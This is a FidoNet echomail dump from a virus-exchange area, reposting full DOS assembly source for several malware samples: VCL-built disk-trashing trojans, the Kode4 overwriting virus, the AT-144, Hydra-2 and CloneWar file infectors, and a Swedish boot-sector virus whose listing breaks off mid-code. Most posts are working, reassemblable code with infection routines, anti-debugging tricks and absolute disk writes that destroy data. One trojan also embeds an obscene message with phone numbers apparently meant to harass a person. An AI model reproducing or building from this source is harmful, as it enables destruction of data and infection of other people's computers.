 Subj : VCL_RICH.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5ec5
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mike Salvino, 2:283/718 (06 Nov 94 16:20)
* To   : Graham Allen
* Subj : VCL_RICH.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mike.Salvino@f718.n283.z2.fidonet.org
; RICHARDS.ASM -- R. Simmons Trojan
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Nowhere Man

virus_type      equ     3                       ; Trojan Horse
is_encrypted    equ     1                       ; We're encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
        assume  cs:code,ds:code,es:code,ss:code
        org     0100h

start           label   near

main            proc    near
        call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

stop_tracing:   mov     cx,09EBh
        mov     ax,0FE05h               ; Acutal move, plus a HaLT
        jmp     $-2
        add     ah,03Bh                 ; AH now equals 025h
        jmp     $-10                    ; Execute the HaLT
        mov     bx,offset null_vector   ; BX points to new routine
        push    cs                      ; Transfer CS into ES
        pop     es                      ; using a PUSH/POP
        int     021h
        mov     al,1                    ; Disable interrupt 1, too
        int     021h
        jmp     short skip_null         ; Hop over the loop
null_vector:    jmp     $                       ; An infinite loop
skip_null:      mov     byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:      mov     al,128                  ; Change here screws DEBUG
        out     021h,al                 ; If tracing then lock keyboard

        mov     si,offset data00        ; SI points to data
        mov     ah,0Eh                  ; BIOS display char. function
display_loop:   lodsb                           ; Load the next char. into AL
        or      al,al                   ; Is the character a null?
        je      disp_strnend            ; If it is, exit
        int     010h                    ; BIOS video interrupt
        jmp     short display_loop      ; Do the next character
disp_strnend:

        mov     ax,0002h                ; First argument is 2
        mov     cx,0010h                ; Second argument is 16
        cli                             ; Disable interrupts (no Ctrl-C)
        cwd                             ; Clear DX (start with sector 0)
        int     026h                    ; DOS absolute write interrupt
        sti                             ; Restore interrupts


        mov     ax,04C00h               ; DOS terminate function
        int     021h
main            endp

data00          db      "C'mon now, trim that FAT!  1 and 2 and 3 and....",13,
10,10,0

vcl_marker      db      "[VCL]",0               ; VCL creation marker


note            db      "The Richard Simmons Trojan; gu"
        db      "aranteed to get rid of that un"
        db      "sightly FAT in no time!",0
        db      "[Richard Simmons Trojan]",0
        db      "Nowhere Man, [NuKE] '92",0

end_of_code     label   near

encrypt_decrypt proc    near
        mov     si,offset start_of_code ; SI points to code to decrypt
        mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       xor     word ptr [si],06734h    ; XOR a word by the key
        inc     si                      ; Do the next word
        inc     si                      ;
        loop    xor_loop                ; Loop until we're through
        ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
        end     main

-+-  GEcho 1.10+
 + Origin: **SERMEDITECH BBS** Soissons FR (+33) 23.73.02.51 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/Txx          Specify output file type

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 37 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : KOD4_129.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5eca
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mikko Hypponen, 2:283/718 (06 Nov 94 16:23)
* To   : Hans Schotel
* Subj : KOD4_129.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mikko.Hypponen@f718.n283.z2.fidonet.org
─────────═════════>>> Article From Evolution #2 - YAM '92

Article Title: Kode 4 v1 Virus
Author: Soltan Griss


;######################################################################
;#  Name:  Kode4 version 1.0 (overwritting stage)
;#  Author:  Soltan Griss  [YAM]
;#
;#  Description: What this sucker does is very simple. it overwrites
;#               the first 46 bytes of all com files in the current
;#               directory, with it's own code... as of scanv93, this
;#               virus is undetectable..
;#
;#
;#  Special Thanks go out to Data Disruptor.. If it were not for you i
;#          would still be fucking lost!!!!
;#
;######################################################################

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h
V_Length        equ     last-start
KODE4           proc    far

start           label   near            ;Check for Virex installiation

                mov     ax,0ff0fh
                int     21h
                cmp     ax,0101h        ;Abort if Virex Protection
                je      done            ; present


                mov     ah,4Eh             ;Find first Com file
                mov     dx,offset filename ;use "*.com"
                int     21h

Back:
                mov     ah,43h              ;get rid of read only
                mov     al,0
                mov     dx,9eh
                int     21h
                mov     ah,43h
                mov     al,01
                and     cx,11111110b
                int     21h

                mov     ax,3D01h           ;Open file for writing
                mov     dx,9Eh             ;get file name from file DTA
                int     21h

                mov     bx,ax               ;save handle in bx
                mov     ah,57h              ;get time date
                mov     al,0
                int     21h

                push    cx                  ;put in stack for later
                push    dx


                mov     dx,100h            ;Start writing at 100h
                mov     cl,v_length        ;write 46 bytes
                mov     ah,40h             ;Write Data into the file
                int     21h


                pop     dx                 ;Restore old dates and times
                pop     cx
                mov     ah,57h
                mov     al,01h
                int     21h



                mov     ah,3Eh             ;Close the file
                int     21h

                mov     ah,4Fh             ;Find Next file
                int     21h

                jnc     Back
                mov     ah,9h
                mov     dx,offset DATA
                int     21h

done:           int     20h                ;Terminate Program
filename        db      "*.c*",0
DATA            db      " -=+ Kode4 +=-, The one and ONLY!$"


kode4           endp
LAST            label near
seg_a           ends
                end     start

-+-  FMail 0.96т
 + Origin: I just hate people who create virusses... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/x            No map file at all

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 38 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : AT_144.ASM                                                              
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5ed3
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Doug Bryce, 2:283/718 (06 Nov 94 16:24)
* To   : Mike Salvino
* Subj : AT_144.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
;This is a disassembly of the AT 144 virus.  It is processor specific
;and will only run on AT-class machines (286+).  It copies itself
;onto the interrupt table and hooks int 21h, function 4bh.  Because
;it is on the interrupt table - to call Int 21h in its infection routine
;it merely calls an INT corresponding to where it stores its
;old handler vectors.  In this case - it is Int B4h.  One interesting thing
;is the JMP SI instruction at the end to return to the host - this
;works because DOS initially sets SI to 100 for running COM files.
;This virus infects any .COM file executed.

;Please - Do NOT release this or any other virus.
;For educational purposes ONLY!  I take no responsibility for damages caused
;by the misuse of this or any other disassembly - they are made to help
;educate programmers as to the workings of the individual viruses and
;viruses as a whole.  Such information MUST remain free and uncensored.

;Disassembly by Black Wolf

.model tiny
.286
.code
    org 100h

start:
        db      0e9h,02,0               ;Jump Virus_Entry

Host_File:
        int     21h                     ;Terminate.

Virus_Entry:
        pusha
        mov     di,si
        call    Get_Displacement

Get_Displacement:
        pop     si
        add     si,31h                  ;SI = storage bytes
        movsb
        movsw                           ;Restore host in memory.

        mov     ax,24h                  ;Set ES:DI to interrupt table
        mov     es,ax                   ;DS:SI to beginning of virus
        xor     di,di
        sub     si,3Ah
        cmp     byte ptr es:[di],60h    ;Check if installed.
        mov     cl,90h
        rep     movsb                   ;Copy virus into memory

        jz      Done_Install
        mov     ds,cx
        mov     si,84h                  ;Get Int 21 vector.
        movsw
        movsw
        mov     word ptr [si-4],3Ah     ;Hook Int 21
        mov     [si-2],ax
        push    cs
        pop     ds

Done_Install:
        push    cs
        pop     es
        popa
        jmp     si                      ;Jumps back to host....
                        ;DOS sets SI = 100h when
                        ;a COM is loaded.
Jump_Byte       db      0e9h
Storage_Bytes:
        mov     ax,4c00h

Int_21_Handler:
        pusha                           ;Save all Regs.
        push    ds
        xor     ah,4Bh                  ;Check if execute
        jnz     Exit_Handler
        mov     ax,3D02h
        int     0B4h                    ;Open the file for read/write
        jc      Exit_Handler
        mov     bx,ax
        push    cs
        pop     ds
        mov     ah,3Fh
        mov     cx,3
        mov     dx,37h
        mov     si,dx
        int     0B4h                    ;Read in 3 bytes for storage.
        cmp     byte ptr [si],4Dh
        je      Close_File              ;Check if it's an EXE
        mov     ax,4202h
        xor     cx,cx
        xor     dx,dx
        int     0B4h                    ;Go to end of file
        sub     al,3                    ;save jump size.
        mov     bp,ax
        mov     cl,90h                  ;If the 2nd and 3rd bytes of
        sub     ax,cx                   ;the file correspond to what
        cmp     ax,[si+1]               ;a jump WOULD be if the virus
                        ;were already there, exit.
        je      Close_File              ;(Quit if infected)
        mov     ah,40h                  ;Append Virus
        int     0B4h
        mov     ax,4200h
        xor     cx,cx
        int     0B4h                    ;Go back to the beginning
        mov     ah,40h
        lea     dx,[si-1]
        mov     cl,3
        mov     [si],bp
        int     0B4h                    ;Write in the jump.

Close_File:
        mov     ah,3Eh
        int     0B4h                    ;Close file.
Exit_Handler:
        pop     ds
        popa                            ;Exit Handler
        db      0EAh                    ;Far Jump to old Int 21h.
end_virus:
end     start

-+-  Concord/QWK O.O1 Beta-7
 + Origin: NETTIS Public Acces Internet (603)432-2517 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/x            Include false conditionals in listing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 39 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : HYDRA_2.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5edc
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Bryan Sullivan, 2:283/718 (06 Nov 94 16:26)
* To   : Edwin Cleton
* Subj : HYDRA_2.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Bryan.Sullivan@f718.n283.z2.fidonet.org
PAGE  59,132

;██████████████████████████████████████████████████████████████████████████
;██                                      ██
;██                             HYDRA2                                   ██
;██                                      ██
;██                                                                      ██
;██  Disassembly by: -=>Wasp<=- aka >>Night Crawler<<                    ██
;██                                                                      ██
;██  Reassemble with TASM 2.0                                            ██
;██████████████████████████████████████████████████████████████████████████

DATA_1E     EQU 235H
DATA_2E     EQU 522H
DATA_3E     EQU 80H
DATA_13E    EQU 157H
DATA_14E    EQU 15AH

SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A


        ORG 100h

HYDRA2      PROC    FAR

START:
        JMP LOC_1           ; (0182)
        DB   59H, 44H, 00H, 00H
DATA_5      DB  'HyDra-2   Beta - Not For Release'
        DB  '. *.CO?'
        DB  0
DATA_8      DW  0, 84FCH
DATA_10     DW  0
DATA_11     DB  0
        DB  29 DUP (0)
DATA_12     DB  0
        DB  13 DUP (0)
COPYRIGHT   DB  'Copyright (c)'
        DB  '  1991 by C.A.V.E.  '
LOC_1:
        PUSH    AX
        MOV AX,CS
        ADD AX,1000H
        XOR DI,DI           ; Zero register
        MOV CX,157H
        MOV SI,OFFSET DS:[100H]
        MOV ES,AX
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AH,1AH
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        MOV DX,OFFSET DATA_5+22H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_5           ; Jump if carry Set
LOC_2:
        MOV AH,3DH          ; '='
        MOV AL,2
        MOV DX,OFFSET DATA_12
        MOV AL,2
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        PUSH    ES
        POP DS
        MOV AX,3F00H
        MOV CX,0FFFFH
        MOV DX,DATA_13E
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        ADD AX,157H
        MOV CS:DATA_10,AX
        CMP WORD PTR DS:DATA_14E,4459H
        JNE LOC_3           ; Jump if not equal
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_6           ; Jump if carry Set
        JMP SHORT LOC_2     ; (01A4)
LOC_3:
        XOR CX,CX           ; Zero register
        MOV DX,CX
        MOV AX,4200H
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_4           ; Jump if carry Set
        MOV AH,40H          ; '@'
        XOR DX,DX           ; Zero register
        MOV CX,CS:DATA_10
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_4:
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
LOC_5:
        MOV AH,1AH
        MOV DX,DATA_3E
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        JMP SHORT LOC_7     ; (0218)
        DB  90H
LOC_6:
        PUSH    DX
        XOR AX,AX           ; Zero register
        XOR AX,AX           ; Zero register
        MOV DS,AX
        MOV BX,DATA_2E
        MOV AH,0FFH
        MOV [BX],AH
        XOR AX,AX           ; Zero register
        INT 13H         ; Disk  dl=drive 0  ah=func 00h
                        ;  reset disk, al=return status
        MOV AX,0
        INT 21H         ; DOS Services  ah=function 00h
                        ;  terminate, cs=progm seg prefx
LOC_7:
        XOR DI,DI           ; Zero register
        MOV SI,DATA_1E
        MOV CX,22H
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        POP BX
        MOV CS:DATA_8,0
        MOV WORD PTR CS:DATA_8+2,ES
        POP BX
        JMP DWORD PTR CS:DATA_8
        DB   1EH, 07H,0B9H,0FFH,0FFH,0BEH
        DB   57H, 02H,0BFH, 00H, 01H, 2BH
        DB  0CEH,0F3H,0A4H, 2EH,0C7H, 06H
        DB   00H, 01H, 00H, 01H, 2EH, 8CH
        DB   1EH, 02H, 01H, 8BH,0C3H, 2EH
        DB  0FFH, 2EH, 00H, 01H,0CDH
        DB  20H

HYDRA2      ENDP

SEG_A       ENDS



        END START

-+-  Terminate 1.50/Pro
 + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/w0,/w1,/w2   Set warning level: w0=none, w1=w2=warnings on

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 40 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : CLONEWAR.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5ee3
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Viral Doctor, 2:283/718 (06 Nov 94 16:26)
* To   : Mike Salvino
* Subj : CLONEWAR.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Viral.Doctor@f718.n283.z2.fidonet.org
;NON-RESIDENT SPAWNER

CSEG        SEGMENT
        ASSUME  CS:CSEG,DS:NOTHING

        ORG 100H    ;Beginning for .COM programs

START:  JMP MY_BEGIN    ;Initialization code is at end

        DB  "CloneWar V1.0 "
wild            DB  "*.EXE",0
file_Ext        DB  "COM",0
file_found      DB  12 DUP(' '), 0
file_create     DB  12 DUP(' '), 0
search_attrib   DW  17H
num_infect      dw  0

my_cmd:
Cmd_len         db  13
file_clone      db  12 DUP (' '), 0

        ASSUME  CS:CSEG, DS:CSEG, ES:NOTHING

;------------------------------------------------------------------;
Prepare_command:
           cld
           mov    di,OFFSET file_clone
           mov    al,0
           mov    cx,12
           repne scasb          ; find the end of string \0

           mov    al,0Dh        ; <CR>
           stosb                ; replace \0 with a <CR>

           mov    ax,12         ;store length of the command
           sub    ax,cx
           mov    cmd_len, al
           ret

;------------------------------------------------------------------;
Store_name:

           MOV    DI,OFFSET file_found   ;Point to buffer.
           MOV    SI,158
           MOV    CX,12
           REP MOVSB

           MOV    DI,OFFSET file_create  ;Point to buffer.
           MOV    SI,158
           MOV    CX,12
           REP MOVSB

           cld
           mov    di,OFFSET file_create
           mov    al,'.'
           mov    cx,9
           repne scasb                   ;find the '.'

           mov    si,OFFSET file_ext
           mov    cx,3
           rep movsb                     ;replace the .EXE with .COM

           ret


;------------------------------------------------------------------;
;Does the file exist?

Check_file:
           mov    dx,OFFSET file_create
           mov    cx,0
           mov    ax,3d00h        ; Open file read only
           int    21h

Chk_done:
           ret

;------------------------------------------------------------------;
Infect_file:
;Create file
           mov    dx,OFFSET file_create
           mov    cx,0
           mov    ah,3ch
           int    21h
           jc     EXIT

;Write to file
           mov    bx,ax
           mov    cx,(OFFSET END_OF_CODE - OFFSET START)
           mov    dx,OFFSET START
           mov    ah,40h
           int    21h

;Close file
           mov    ah,3eh    ; ASSUMES bx still has file handle
           int    21h

;Change attributes
           mov    dx,OFFSET file_create
           mov    cx,3          ;(1) read only, (2) hidden, (4) system
           mov    ax,4301h
           int    21h

           ret

;------------------------------------------------------------------;
; Read all the directory filenames and store as records in buffer. ;
;------------------------------------------------------------------;

MY_BEGIN:
               mov    sp,offset STACK_HERE      ;move stack down
               mov    bx,sp
               add    bx,15
               mov    cl,4
               shr    bx,cl
               mov    ah,4ah                  ;deallocate rest of memory
               int    21h

               MOV    DI,OFFSET file_clone ;Point to buffer.
           MOV    SI,OFFSET file_found
           MOV    CX,12
           REP MOVSB

READ_DIR:      MOV    DX,OFFSET wild
           MOV    CX,search_attrib

           MOV    AH,4EH     ; This finds the first matching file.
           INT    21H

           JC     EXIT                   ;If empty directory, exit.

Do_file:
           call   Store_name

           call   Check_file
           jnc    seek_another  ; CF = 0, shadow already there... skip it

           call   Infect_file
           jmp    Exit

seek_another:

find_next:
           mov   ah,4fh
           int   21h
           jmp   Do_file

EXIT:

;Run the original program
           call   Prepare_command
           mov    si, OFFSET my_cmd
           int    2Eh                 ;Pass command to command
                      ; interpreter for execution
;Exit to DOS
           MOV    AX,4C00H
           INT    21H

END_OF_CODE =   $

STACK_HERE  EQU   END_OF_CODE + 512

CSEG        ENDS
        END START

-+-  PPoint 1.86
 + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/a,/s         Alphabetic or Source-code segment ordering

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 41 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : VCLMIKES.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5ee9
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Ron Toler, 2:283/718 (06 Nov 94 16:27)
* To   : Viral Doctor
* Subj : VCLMIKES.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
; MIKESICA.ASM -- Mike Sica v1.0
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Digital Justice

virus_type      equ     3                       ; Trojan Horse
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
        assume  cs:code,ds:code,es:code,ss:code
        org     0100h

start           label   near

main            proc    near
stop_tracing:   mov     cx,09EBh
        mov     ax,0FE05h               ; Acutal move, plus a HaLT
        jmp     $-2
        add     ah,03Bh                 ; AH now equals 025h
        jmp     $-10                    ; Execute the HaLT
        mov     bx,offset null_vector   ; BX points to new routine
        push    cs                      ; Transfer CS into ES
        pop     es                      ; using a PUSH/POP
        int     021h
        mov     al,1                    ; Disable interrupt 1, too
        int     021h
        jmp     short skip_null         ; Hop over the loop
null_vector:    jmp     $                       ; An infinite loop
skip_null:      mov     byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:      mov     al,128                  ; Change here screws DEBUG
        out     021h,al                 ; If tracing then lock keyboard

        mov     ah,0Fh                  ; BIOS get video mode function
        int     010h
        xor     ah,ah                   ; BIOS set video mode function
        int     010h

        mov     dx,0045h                ; First argument is 69
        push    es                      ; Save ES
        mov     ax,040h                 ; Set extra segment to 040h
        mov     es,ax                   ; (ROM BIOS)
        mov     word ptr es:[013h],dx   ; Store new RAM ammount
        pop     es                      ; Restore ES

        mov     si,0001h                ; First argument is 1
        push    es                      ; Save ES
        xor     ax,ax                   ; Set the extra segment to
        mov     es,ax                   ; zero (ROM BIOS)
        shl     si,1                    ; Convert to word index
        mov     word ptr [si + 0407h],0 ; Zero LPT port address
        pop     es                      ; Restore ES

        mov     si,0001h                ; First argument is 1
        push    es                      ; Save ES
        xor     ax,ax                   ; Set the extra segment to
        mov     es,ax                   ; zero (ROM BIOS)
        shl     si,1                    ; Convert to word index
        mov     word ptr [si + 03FEh],0 ; Zero COM port address
        pop     es                      ; Restore ES

        mov     ax,0002h                ; First argument is 2
        mov     cx,0064h                ; Second argument is 100
        cli                             ; Disable interrupts (no Ctrl-C)
        cwd                             ; Clear DX (start with sector 0)
trash_loop:     int     026h                    ; DOS absolute write interrupt
        dec     ax                      ; Select the previous disk
        cmp     ax,-1                   ; Have we gone too far?
        jne     trash_loop              ; If not, repeat with new drive
        sti                             ; Restore interrupts

        cli                             ; Clear the interrupt flag
        hlt                             ; HaLT the computer
        jmp     short $                 ; Just to make sure

        mov     cx,0045h                ; First argument is 69
        jcxz    beep_end                ; Exit if there are no beeps
        mov     ax,0E07h                ; BIOS display char., BEL
beep_loop:      int     010h                    ; Beep
        loop    beep_loop               ; Beep until --CX = 0
beep_end:


        mov     ax,04C00h               ; DOS terminate function
        int     021h
main            endp

vcl_marker      db      "[VCL]",0               ; VCL creation marker


note            db      "!! Written By Mike Sica !!"
        db      "I Suck Big Phat Hairy Cocks!!"
        db      "Call Anytime Phor Good Head:"
        db      "794-0533 or 794-3626"
        db      "Both In The 804 Area Code!!"

finish          label   near

code            ends
        end     main

-+-  GEcho 1.10+
 + Origin: Data Fellows BBS (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/x            Include false conditionals in listing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 42 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : SWEDISH.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5eef
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Daniel Hendry, 2:283/718 (06 Nov 94 16:28)
* To   : Brad Frazee
* Subj : SWEDISH.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Daniel.Hendry@f718.n283.z2.fidonet.org
;
; LДgger gamla bootsectorn pЖ sida 1, spЖr 0, sector 3.
;                             sida 0, spЖr 0, sector 7 pЖ HD.

Code    Segment
    Assume  cs:Code
    Org 0000h

Main    Proc    Far
    db  0EAh,05h,00h,0C0h,07h

    jmp Near Ptr Init       ; Hoppa fФrbi variabler och nya int13h

; Variabler

Old13h  dd  0           ; Gamla vectorn till diskfunktionerna.
TmpVec  dd  0           ; TemporДr vec. vid Дndring av int 13.
BootPek dw  0003h,0100h
; Slut pЖ variabler
Int13h  Proc    Near
        push    ds
    push    ax
    push    bx

    cmp dl,00h          ; Drive A
    jne Exit

    cmp ah,02h
    jb  Exit
    cmp ah,04h
    ja  Exit            ; Kolla sЖ att func. 2-4

    sub ax,ax
    mov ds,ax
    mov bx,043Fh        ; Motor status byte.
    test    Byte Ptr [bx],01h   ; Testa om motorn i A: Дr pЖ..
    jnz Exit            ; Nej,hoppa till gamla int 13h

    call    Smitta

Exit:   pop bx
    pop ax
    pop ds
    jmp [Old13h]

Smitta  Proc    Near
    push    cx
    push    dx
    push    si
    push    di
    push    es

    push    cs
    pop es
    push    cs
    pop ds

    mov si,0004h        ; Max antal fФrsФk.

Retry:  mov ax,0201h        ; LДs en sector
    mov bx,0200h                ; LДs hit.
    mov cx,0001h        ; SpЖr 0 Sector 1
    sub dx,dx           ; Sida 0 Drive 0
    pushf
    call    [Old13h]        ; LДs in booten.

    jnc OK

    dec si
    jz  Slut            ; Hoppa ur om fel.
    jmp Retry           ; FФrsФk max 4 gЖnger.

OK: mov si,0200h
    sub di,di
    cld
    lodsw
    cmp ax,[di]
    jne L2
    lodsw
    cmp ax,[di+2]
    jne L2
    jmp Slut

L2: mov ax,0301h                ; Skriv en sector.
    mov bx,0200h
    mov cx,0003h        ; SpЖr 0 Sector 3
    mov dx,0100h        ; Sida 1 Drive 0
    pushf
    call    [Old13h]        ; Flytta boot sectorn.

    mov ax,0301h
    sub bx,bx
    mov cx,0001h
    sub dx,dx
    pushf
    call    [Old13h]        ; Skriv ner viruset till booten.

Slut:   pop     es
    pop di
    pop si
    pop dx
    pop cx
    ret
Smitta  Endp
Int13h  Endp

Init:   sub ax,ax
    mov ds,ax           ; Nollar ds fФr att Дndra vect.

    cli
    mov ss,ax
    mov sp,7C00h
    sti             ; SДtter upp en ny stack.

    push    cs
    pop es
    mov di,Offset Old13h
    mov si,004Ch
    mov cx,0004h
    cld
    rep movsb           ; Flytta int 13h vectorn.

    mov bx,0413h
    mov ax,[bx]         ; Minnesstorleken till ax.
    dec ax
    dec ax
